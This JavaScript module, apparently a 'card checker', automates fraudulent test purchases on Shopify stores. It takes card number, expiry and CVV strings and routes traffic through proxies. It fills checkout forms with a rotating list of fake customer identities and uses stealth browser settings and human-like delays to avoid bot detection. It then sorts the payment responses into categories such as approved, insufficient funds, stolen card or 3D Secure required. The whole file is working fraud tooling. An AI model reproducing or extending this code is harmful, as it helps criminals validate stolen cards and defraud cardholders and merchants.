// ==========================================
// SHOPIFY.JS — All in One
// ==========================================

const puppeteer = require("puppeteer-extra");
const StealthPlugin = require("puppeteer-extra-plugin-stealth");
const axios = require("axios");

puppeteer.use(StealthPlugin());

// ==========================================
// HELPERS — Inline
// ==========================================
function sleep(ms) {
  return new Promise((r) => setTimeout(r, ms));
}

function humanDelay(min = 500, max = 1500) {
  return sleep(Math.floor(Math.random() * (max - min)) + min);
}

function parseCC(ccStr) {
  const parts = ccStr.trim().split(/[|\/\s]+/);
  if (parts.length !== 4) return null;
  let [number, month, year, cvv] = parts;
  if (year.length === 2) year = "20" + year;
  if (month.length === 1) month = "0" + month;
  return { number, month, year, cvv };
}

function parseProxy(proxyStr) {
  if (!proxyStr || proxyStr.trim() === "") return null;
  try {
    proxyStr = proxyStr.trim()
      .replace(/^https?:\/\//, "")
      .replace(/^socks5?:\/\//, "");
    let host, port, username, password;
    if (proxyStr.includes("@")) {
      const atIdx = proxyStr.lastIndexOf("@");
      const auth = proxyStr.substring(0, atIdx);
      const hostPort = proxyStr.substring(atIdx + 1);
      const authParts = auth.split(":");
      const hpParts = hostPort.split(":");
      username = authParts[0];
      password = authParts.slice(1).join(":");
      host = hpParts[0];
      port = hpParts[1] || "8080";
    } else {
      const parts = proxyStr.split(":");
      if (parts.length >= 4) {
        host = parts[0]; port = parts[1];
        username = parts[2]; password = parts.slice(3).join(":");
      } else if (parts.length === 2) {
        host = parts[0]; port = parts[1];
      } else return null;
    }
    if (!host || !port) return null;
    return { host, port, username: username || null, password: password || null };
  } catch (e) { return null; }
}

const FAKE_CUSTOMERS = [
  { firstName: "John", lastName: "Smith", email: "john.smith92@gmail.com", phone: "2125551234", address: "123 Main St", city: "New York", zip: "10001", state: "NY" },
  { firstName: "Emily", lastName: "Johnson", email: "emily.j1990@yahoo.com", phone: "3105559876", address: "456 Oak Ave", city: "Los Angeles", zip: "90001", state: "CA" },
  { firstName: "Michael", lastName: "Brown", email: "m.brown88@hotmail.com", phone: "7735554567", address: "789 Pine Rd", city: "Chicago", zip: "60601", state: "IL" },
  { firstName: "Sarah", lastName: "Davis", email: "sarah.davis@gmail.com", phone: "6175558901", address: "321 Elm St", city: "Boston", zip: "02101", state: "MA" },
  { firstName: "David", lastName: "Wilson", email: "d.wilson95@outlook.com", phone: "4155552345", address: "654 Maple Dr", city: "San Francisco", zip: "94101", state: "CA" },
  { firstName: "Jessica", lastName: "Martinez", email: "jess.martinez@gmail.com", phone: "7025556789", address: "987 Cedar Ln", city: "Las Vegas", zip: "89101", state: "NV" },
  { firstName: "James", lastName: "Taylor", email: "james.t2000@gmail.com", phone: "2025553456", address: "147 Washington Blvd", city: "Washington", zip: "20001", state: "DC" },
];

function getFakeCustomer() {
  return FAKE_CUSTOMERS[Math.floor(Math.random() * FAKE_CUSTOMERS.length)];
}

// ==========================================
// GET CHEAPEST PRODUCT
// ==========================================
async function getCheapestProduct(site) {
  try {
    const url = site.endsWith("/")
      ? site + "products.json?limit=250"
      : site + "/products.json?limit=250";
    const res = await axios.get(url, {
      timeout: 10000,
      headers: {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        Accept: "application/json",
      },
    });
    const products = res.data?.products || [];
    if (products.length === 0) return null;
    let allVariants = [];
    products.forEach((p) => {
      p.variants?.forEach((v) => {
        allVariants.push({
          productTitle: p.title,
          variantId: v.id,
          price: parseFloat(v.price || "0"),
          available: v.available !== false,
        });
      });
    });
    const available = allVariants
      .filter((v) => v.available && v.price > 0)
      .sort((a, b) => a.price - b.price);
    return available[0] || allVariants[0] || null;
  } catch (e) {
    console.error("[PRODUCT] Error:", e.message);
    return null;
  }
}

// ==========================================
// DISMISS POPUPS
// ==========================================
async function dismissPopups(page) {
  try {
    await page.keyboard.press("Escape");
    await sleep(300);
    const closeSelectors = [
      'button[aria-label="Close"]', 'button[aria-label="close"]',
      'button[aria-label="Dismiss"]', '[class*="close"]',
      '[class*="Close"]', '[class*="dismiss"]',
      '[id*="close"]', '[id*="popup"] button',
      '[id*="modal"] button', '.klaviyo-close',
      '.privy-dismiss-text', '.pum-close',
      '[data-dismiss="modal"]', 'button[title="Close"]',
      '.modal-close', '.popup-close',
    ];
    for (const selector of closeSelectors) {
      try {
        const elements = await page.$$(selector);
        for (const el of elements) {
          try {
            const visible = await el.isIntersectingViewport().catch(() => false);
            if (visible) { await el.click(); await sleep(200); }
          } catch (e) {}
        }
      } catch (e) {}
    }
    await page.evaluate(() => {
      const sels = ['[class*="modal"]','[class*="popup"]','[class*="overlay"]','[class*="backdrop"]','[id*="modal"]','[id*="popup"]'];
      sels.forEach((sel) => {
        document.querySelectorAll(sel).forEach((el) => {
          try {
            const style = window.getComputedStyle(el);
            if ((style.position === "fixed" || style.position === "absolute") && parseInt(style.zIndex) > 50) {
              el.style.display = "none";
            }
          } catch (e) {}
        });
      });
      document.body.style.overflow = "";
      document.documentElement.style.overflow = "";
    });
  } catch (e) {}
}

// ==========================================
// TYPE IN FIELD
// ==========================================
async function typeInField(page, selectors, value, delayMs = 70) {
  for (const sel of selectors) {
    try {
      const el = await page.$(sel);
      if (el) {
        await el.click({ clickCount: 3 });
        await sleep(100);
        await el.type(value, { delay: delayMs + Math.random() * 30 });
        return true;
      }
    } catch (e) {}
  }
  return false;
}

// ==========================================
// CLICK BUTTON
// ==========================================
async function clickButton(page, selectors) {
  for (const sel of selectors) {
    try {
      const btn = await page.$(sel);
      if (btn) {
        const visible = await btn.isIntersectingViewport().catch(() => true);
        if (visible) { await btn.click(); return true; }
      }
    } catch (e) {}
  }
  return false;
}

// ==========================================
// FILL CUSTOMER INFO
// ==========================================
async function fillCustomerInfo(page, customer) {
  try {
    await typeInField(page, [
      '#email', '#checkout_email',
      'input[type="email"]', 'input[autocomplete="email"]',
      'input[name="email"]', '[data-testid="email-field"] input',
    ], customer.email);
    await humanDelay(300, 600);

    await typeInField(page, [
      '#firstName', '#checkout_shipping_address_first_name',
      'input[name="firstName"]', 'input[autocomplete="given-name"]',
    ], customer.firstName);

    await typeInField(page, [
      '#lastName', '#checkout_shipping_address_last_name',
      'input[name="lastName"]', 'input[autocomplete="family-name"]',
    ], customer.lastName);

    await humanDelay(200, 500);

    await typeInField(page, [
      '#address1', '#checkout_shipping_address_address1',
      'input[name="address1"]', 'input[autocomplete="address-line1"]',
    ], customer.address);

    await humanDelay(300, 600);

    await typeInField(page, [
      '#city', '#checkout_shipping_address_city',
      'input[name="city"]', 'input[autocomplete="address-level2"]',
    ], customer.city);

    await typeInField(page, [
      '#postalCode', '#zip', '#checkout_shipping_address_zip',
      'input[name="postalCode"]', 'input[name="zip"]',
      'input[autocomplete="postal-code"]',
    ], customer.zip);

    await humanDelay(500, 1000);

    await clickButton(page, [
      'button[type="submit"]', '#continue_button',
      '[data-testid="continue-button"]', 'button[id*="continue"]',
      'input[type="submit"]',
    ]);

    await humanDelay(2000, 3500);
    await dismissPopups(page);

    await clickButton(page, [
      'button[type="submit"]', '#continue_button',
      '[data-testid="continue-button"]',
    ]);

    await humanDelay(2000, 3500);
    await dismissPopups(page);

  } catch (e) {
    console.error("[FILL INFO] Error:", e.message);
  }
}

// ==========================================
// FILL CARD DETAILS
// ==========================================
async function fillCardDetails(page, cc, customer) {
  try {
    await humanDelay(500, 1000);

    const frames = page.frames();
    let cardFrame = null;
    for (const frame of frames) {
      const url = frame.url();
      if (url.includes("shopifycs.com") || url.includes("pay.shopify")) {
        cardFrame = frame;
        break;
      }
    }
    const target = cardFrame || page;

    await typeInField(target, [
      'input[autocomplete="cc-number"]', 'input[name="number"]',
      '#number', '[data-card-field="number"] input',
      'input[placeholder*="Card number"]',
    ], cc.number);
    await humanDelay(400, 700);

    await typeInField(target, [
      'input[autocomplete="cc-exp-month"]', 'input[name="month"]', '#month',
    ], cc.month);
    await humanDelay(200, 400);

    await typeInField(target, [
      'input[autocomplete="cc-exp-year"]', 'input[name="year"]', '#year',
    ], cc.year);
    await humanDelay(200, 400);

    await typeInField(target, [
      'input[autocomplete="cc-csc"]', 'input[name="verification_value"]',
      '#verification_value', 'input[placeholder*="CVV"]',
      'input[placeholder*="CVC"]',
    ], cc.cvv);
    await humanDelay(200, 400);

    await typeInField(target, [
      'input[autocomplete="cc-name"]', 'input[name="name"]', '#name',
      'input[placeholder*="Name on card"]',
    ], `${customer.firstName} ${customer.lastName}`);

    console.log(`[CARD] Fields filled`);
    return true;
  } catch (e) {
    console.error("[CARD FILL] Error:", e.message);
    return false;
  }
}

// ==========================================
// PARSE RESULT
// ==========================================
function parseResult(url, content) {
  const u = url.toLowerCase();
  const c = content.toLowerCase();

  if (
    u.includes("/thank_you") || u.includes("thank_you") ||
    u.includes("/orders/") ||
    c.includes("thank you for your order") ||
    c.includes("order confirmed") ||
    c.includes("your order is confirmed")
  ) {
    return { Status: true, Response: "ORDER_PLACED", Gateway: "Shopify Payments", Price: 1.0 };
  }

  if (
    u.includes("3ds") || c.includes("3d secure") ||
    c.includes("authentication required") ||
    c.includes("verify your card")
  ) {
    return { Status: true, Response: "3D_SECURE_REQUIRED", Gateway: "Shopify Payments", Price: 1.0 };
  }

  const declines = [
    { k: "do not honor", r: "DO_NOT_HONOR" },
    { k: "insufficient funds", r: "INSUFFICIENT_FUNDS" },
    { k: "your card was declined", r: "CARD_DECLINED" },
    { k: "card was declined", r: "CARD_DECLINED" },
    { k: "invalid card number", r: "INVALID_CARD_NUMBER" },
    { k: "card number is invalid", r: "INVALID_CARD_NUMBER" },
    { k: "expired card", r: "EXPIRED_CARD" },
    { k: "card has expired", r: "EXPIRED_CARD" },
    { k: "incorrect cvc", r: "INCORRECT_CVV" },
    { k: "incorrect zip", r: "INCORRECT_ZIP" },
    { k: "stolen card", r: "STOLEN_CARD" },
    { k: "lost card", r: "LOST_CARD" },
    { k: "restricted card", r: "RESTRICTED_CARD" },
    { k: "security violation", r: "SECURITY_VIOLATION" },
    { k: "transaction not allowed", r: "TRANSACTION_NOT_ALLOWED" },
    { k: "generic decline", r: "GENERIC_DECLINE" },
    { k: "processing error", r: "PROCESSING_ERROR" },
    { k: "call your bank", r: "CALL_YOUR_BANK" },
    { k: "pickup card", r: "PICKUP_CARD" },
    { k: "blocked card", r: "BLOCKED_CARD" },
  ];

  for (const { k, r } of declines) {
    if (c.includes(k)) {
      return { Status: false, Response: r, Gateway: "Shopify Payments" };
    }
  }

  if (c.includes("declined") || c.includes("was declined")) {
    return { Status: false, Response: "DECLINED", Gateway: "Shopify Payments" };
  }

  if (u.includes("checkout")) {
    return { Status: false, Response: "CHECKOUT_INCOMPLETE", Gateway: "Shopify Payments" };
  }

  return { Status: false, Response: "UNKNOWN", Gateway: "Shopify Payments" };
}

// ==========================================
// MAIN CHECK FUNCTION
// ==========================================
async function checkShopify(site, ccStr, proxyStr) {
  const cc = parseCC(ccStr);
  if (!cc) return { Status: false, Response: "INVALID_CC_FORMAT", Gateway: "Shopify Payments" };

  const proxy = parseProxy(proxyStr);
  const customer = getFakeCustomer();

  if (!site.endsWith("/")) site += "/";

  console.log(`\n[CHECK] CC: ${cc.number}|${cc.month}|${cc.year}|${cc.cvv}`);
  console.log(`[CHECK] Site: ${site}`);
  console.log(`[CHECK] Proxy: ${proxyStr || "None"}`);

  const product = await getCheapestProduct(site);
  if (!product) return { Status: false, Response: "NO_PRODUCTS_FOUND", Gateway: "Shopify Payments" };
  console.log(`[PRODUCT] ${product.productTitle} — $${product.price}`);

  const launchArgs = [
    "--no-sandbox", "--disable-setuid-sandbox",
    "--disable-dev-shm-usage", "--disable-accelerated-2d-canvas",
    "--no-first-run", "--no-zygote", "--disable-gpu",
    "--disable-blink-features=AutomationControlled",
    "--disable-infobars", "--window-size=1366,768",
  ];

  if (proxy) {
    launchArgs.push(`--proxy-server=${proxy.host}:${proxy.port}`);
  }

  let browser = null;
  try {
    browser = await puppeteer.launch({
      headless: "new",
      args: launchArgs,
      ignoreHTTPSErrors: true,
      timeout: 30000,
    });

    const page = await browser.newPage();

    if (proxy?.username && proxy?.password) {
      await page.authenticate({ username: proxy.username, password: proxy.password });
    }

    await page.setViewport({ width: 1366, height: 768 });
    await page.setUserAgent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36");
    await page.setExtraHTTPHeaders({ "Accept-Language": "en-US,en;q=0.9" });

    await page.setRequestInterception(true);
    page.on("request", (req) => {
      if (["image", "font", "media"].includes(req.resourceType())) {
        req.abort();
      } else {
        req.continue();
      }
    });

    page.setDefaultTimeout(30000);
    page.setDefaultNavigationTimeout(30000);

    // Visit site
    console.log(`[BROWSER] Visiting site...`);
    await page.goto(site, { waitUntil: "domcontentloaded", timeout: 30000 });
    await humanDelay(800, 1500);
    await dismissPopups(page);

    // Add to cart
    console.log(`[CART] Adding product...`);
    await page.evaluate(async (url, variantId) => {
      await fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ id: variantId, quantity: 1 }),
      });
    }, site + "cart/add.js", product.variantId);
    await humanDelay(500, 1000);

    // Go to checkout
    console.log(`[CHECKOUT] Going to checkout...`);
    await page.goto(site + "checkout", { waitUntil: "domcontentloaded", timeout: 30000 });
    await humanDelay(1500, 2500);
    await dismissPopups(page);

    // Fill info
    console.log(`[CHECKOUT] Filling info...`);
    await fillCustomerInfo(page, customer);
    await dismissPopups(page);

    // Fill card
    console.log(`[PAYMENT] Filling card...`);
    await fillCardDetails(page, cc, customer);
    await humanDelay(500, 1000);

    // Submit
    console.log(`[PAYMENT] Submitting...`);
    await clickButton(page, [
      'button[type="submit"]', '#continue_button',
      '[data-testid="continue-button"]',
      'button[id*="pay"]', 'button[class*="pay"]',
      'input[type="submit"]',
    ]);

    await humanDelay(4000, 6000);

    // Result
    const finalUrl = page.url();
    const content = await page.content();
    console.log(`[RESULT] URL: ${finalUrl}`);

    const result = parseResult(finalUrl, content);
    console.log(`[RESULT] ${JSON.stringify(result)}`);

    await browser.close();
    return result;

  } catch (err) {
    console.error("[CHECKER] Fatal:", err.message);
    if (browser) try { await browser.close(); } catch (e) {}
    return { Status: false, Response: "ERROR: " + err.message, Gateway: "Shopify Payments" };
  }
}

module.exports = { checkShopify };
